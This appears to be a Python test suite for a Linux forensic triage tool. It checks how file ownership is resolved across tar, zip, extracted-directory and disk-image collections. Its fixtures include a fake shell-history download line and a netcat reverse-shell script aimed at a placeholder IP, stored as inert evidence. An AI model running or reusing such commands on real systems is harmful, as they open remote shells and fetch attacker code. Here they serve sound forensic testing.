#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Test who FILE_INVENTORY says owned every file, per backend.

    python tests/test_inventory.py            # against src/linsight
    python tests/test_inventory.py --built    # against the built linsight.py

The collections are built here, in a temp directory, because the whole point
of this suite is that the same six files answer differently depending on the
container they arrive in - and the interesting answers are the two that are
blank.

An owner is not a cosmetic column. It is read as a statement about the host,
so the ways it can be wrong are worse than the ways it can be missing:

  wrong host   uid 1001 means nothing until it is resolved, and it must be
               resolved against the *collection's* /etc/passwd. Resolved
               against the analysis box it names whoever happens to hold 1001
               there, which is a real account name attached to somebody
               else's file.
  wrong owner  the owner of an extracted directory is whoever ran `tar -x`.
               Reading st_uid back would report the analyst as the owner of
               every file on the host, in a column an examiner will quote.
  wrong source the tar header is the host's when the collector wrote it and
               the inode's own record is better. Where both exist the inode
               has to win, or a re-tarred collection quietly overrides the
               bodyfile it carries.

So half of these assert an empty cell, and one asserts a number that did not
resolve - because a uid no passwd entry claims is a lead, not a failure.
"""

import argparse
import io
import os
import sys
import tarfile
import tempfile
import time
import zipfile

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)

#: /etc/passwd as the *collection* has it. 1001 is deploy here and is
#: deliberately a uid the analysis box is likely to have too, under another
#: name - that is the confusion this suite exists to catch.
PASSWD = (b"root:x:0:0:root:/root:/bin/bash\n"
          b"www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
          b"deploy:x:1001:1001:deploy:/home/deploy:/bin/bash\n")

#: (member, bytes, tar uname, tar uid). '/tmp/.x' carries no uname on purpose:
#: a tar written where no passwd entry claims the uid looks exactly like this.
FILES = [
    ("live_response/process/ps.txt", b"root 1 /sbin/init\n", "root", 0),
    ("[root]/etc/passwd", PASSWD, "root", 0),
    ("[root]/var/www/html/upload.php", b"<?php ?>\n", "www-data", 33),
    ("[root]/home/deploy/.bash_history", b"curl -O http://1.2.3.4/x\n",
     "deploy", 1001),
    ("[root]/tmp/.x", b"#!/bin/sh\nnc -e /bin/sh 1.2.3.4 4444\n", "", 1337),
]

#: The bodyfile disagrees with the tar headers on every file it names, so a
#: test that passes cannot be passing by coincidence: upload.php is www-data
#: in the header and 1001 on the inode, and /tmp/.x is 1337 in the header and
#: 0 on the inode.
BODYFILE = (b"0|/etc/passwd|11|-rw-r--r--|0|0|120|0|1700000000|0|0\n"
            b"0|/var/www/html/upload.php|12|-rw-r--r--|1001|1001|9|0|1700000000|0|0\n"
            b"0|/tmp/.x|13|-rwxr-xr-x|0|0|10|0|1700000000|0|0\n")


def load(built):
    """The package, or the built single file, as one flat namespace."""
    if built:
        import importlib.util
        path = os.path.join(ROOT, "linsight.py")
        if not os.path.exists(path):
            raise SystemExit("[!] %s does not exist - run tools/build.py"
                             % path)
        spec = importlib.util.spec_from_file_location("linsight_built", path)
        module = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(module)
        return module
    sys.path.insert(0, os.path.join(ROOT, "src"))
    import linsight.collect, linsight.disk, linsight.tables, linsight.triage

    class Flat(object):
        pass

    flat = Flat()
    for mod in (linsight.collect, linsight.disk, linsight.tables,
                linsight.triage):
        for name in dir(mod):
            if not name.startswith("__"):
                setattr(flat, name, getattr(mod, name))
    return flat


# ---------------------------------------------------------------------------
# the same collection, in four containers
# ---------------------------------------------------------------------------

def write_tar(path, bodyfile=False):
    with tarfile.open(path, "w") as tf:
        items = list(FILES)
        if bodyfile:
            items.append(("bodyfile/bodyfile.txt", BODYFILE, "root", 0))
        for name, data, uname, uid in items:
            ti = tarfile.TarInfo(name)
            ti.size, ti.mtime, ti.mode = len(data), int(time.time()) - 86400, 0o644
            ti.uname, ti.uid = uname, uid
            ti.gname, ti.gid = uname, uid
            tf.addfile(ti, io.BytesIO(data))
    return path


def write_zip(path):
    with zipfile.ZipFile(path, "w") as zf:
        for name, data, _u, _i in FILES:
            zf.writestr(name, data)
    return path


def write_dir(path):
    for name, data, _u, _i in FILES:
        full = os.path.join(path, name.replace("/", os.sep))
        os.makedirs(os.path.dirname(full), exist_ok=True)
        with open(full, "wb") as fh:
            fh.write(data)
    return path


class Opts(object):
    """The handful of flags the table build reads, and nothing else."""
    quiet = True
    debug = False
    scope = "full"
    sigma = None
    keywords = None
    no_hunt = True
    pivot = None


def inventory(L, col):
    """FILE_INVENTORY over one collection -> {path: (owner, owner_source)}."""
    tri = L.Triage(col, Opts())
    tri.analyze_accounts()          # what uid_name resolves against
    tb = L.TableBuilder(col, tri)
    tb.build(only=["t_file_inventory"], verbose=False)
    t = next(x for x in tb.tables if x.name == "FILE_INVENTORY")
    i = t.columns.index("owner")
    return dict((r[0], (r[i], r[i + 1])) for r in t.iter_rows())


# ---------------------------------------------------------------------------
# harness
# ---------------------------------------------------------------------------

class Result(object):
    def __init__(self):
        self.passed = 0
        self.failed = []

    def check(self, what, cond, why="did not hold"):
        if cond:
            self.passed += 1
            print("  [ok] %s" % what)
        else:
            self.failed.append((what, why))
            print("  [!!] %s: %s" % (what, why))

    def skip(self, what, why):
        print("  [--] %s: %s" % (what, why))


# ---------------------------------------------------------------------------
# checks
# ---------------------------------------------------------------------------

def check_tar(L, tmp, res):
    print("\na tar, which is the only container that carries an owner")
    got = inventory(L, L.Collection(write_tar(os.path.join(tmp, "plain.tar"))))

    res.check("the header's uname is the owner",
              got["[root]/etc/passwd"] == ("root", "archive"),
              "got %r" % (got.get("[root]/etc/passwd"),))
    res.check("and it is the header's, not this host's",
              got["[root]/var/www/html/upload.php"] == ("www-data", "archive"),
              "got %r" % (got.get("[root]/var/www/html/upload.php"),))
    res.check("a header with no uname keeps the bare uid, which is the lead",
              got["[root]/tmp/.x"] == ("1337", "archive"),
              "got %r" % (got.get("[root]/tmp/.x"),))
    res.check("the collector's own output is owned too",
              got["live_response/process/ps.txt"] == ("root", "archive"),
              "got %r" % (got.get("live_response/process/ps.txt"),))


def check_bodyfile_wins(L, tmp, res):
    print("\nthe same tar, carrying a bodyfile that disagrees with it")
    got = inventory(L, L.Collection(write_tar(os.path.join(tmp, "body.tar"),
                                              bodyfile=True)))

    res.check("the inode beats the container header",
              got["[root]/var/www/html/upload.php"] == ("deploy", "bodyfile"),
              "header said www-data, inode says 1001; got %r"
              % (got.get("[root]/var/www/html/upload.php"),))
    res.check("including where the header looked like a lead and was not",
              got["[root]/tmp/.x"] == ("root", "bodyfile"),
              "got %r" % (got.get("[root]/tmp/.x"),))
    res.check("a file the bodyfile does not name still falls back",
              got["live_response/process/ps.txt"] == ("root", "archive"),
              "got %r" % (got.get("live_response/process/ps.txt"),))
    res.check("1001 resolved against the collection's passwd, not this box's",
              got["[root]/var/www/html/upload.php"][0] == "deploy",
              "got %r" % (got.get("[root]/var/www/html/upload.php"),))


def check_blank(L, tmp, res):
    print("\nthe two containers that cannot answer, and do not guess")
    z = inventory(L, L.Collection(write_zip(os.path.join(tmp, "coll.zip"))))
    res.check("a zip has no POSIX owner, so every cell is empty",
              all(v == ("", "") for v in z.values()),
              "got %r" % ([k for k, v in z.items() if v != ("", "")],))

    d = os.path.join(tmp, "extracted")
    os.makedirs(d, exist_ok=True)
    got = inventory(L, L.Collection(write_dir(d)))
    res.check("an extracted directory reports nobody rather than the analyst",
              all(v == ("", "") for v in got.values()),
              "got %r" % ([k for k, v in got.items() if v != ("", "")],))


def check_disk(L, res):
    print("\na disk image, where the uid is read off the inode")
    img = os.path.join(ROOT, "tests", "fixtures", "ext4.img")
    if not os.path.exists(img):
        res.skip("a disk image reads the owner from the inode",
                 "no ext4.img fixture")
        return
    got = inventory(L, L.DiskCollection(img))
    named = [(p, v) for p, v in got.items() if v[0]]
    res.check("every file on the image has an owner",
              len(named) > 100, "only %d of %d rows carry one"
              % (len(named), len(got)))
    res.check("and it is sourced as the filesystem, not a bodyfile",
              all(v[1] == "filesystem" for _p, v in named),
              "got %r" % (sorted(set(v[1] for _p, v in named)),))
    res.check("resolved to names rather than left numeric",
              any(not v[0].isdigit() for _p, v in named),
              "every owner is still a number")


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--built", action="store_true",
                    help="test the built linsight.py instead of src/linsight")
    opts = ap.parse_args()
    L = load(opts.built)

    res = Result()
    tmp = tempfile.mkdtemp(prefix="linsight-inv-")
    print("collections: %s" % tmp)

    check_tar(L, tmp, res)
    check_bodyfile_wins(L, tmp, res)
    check_blank(L, tmp, res)
    check_disk(L, res)

    print("\n%d passed, %d failed" % (res.passed, len(res.failed)))
    if res.failed:
        print("\nfailures:")
        for what, why in res.failed:
            print("  %s: %s" % (what, why))
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
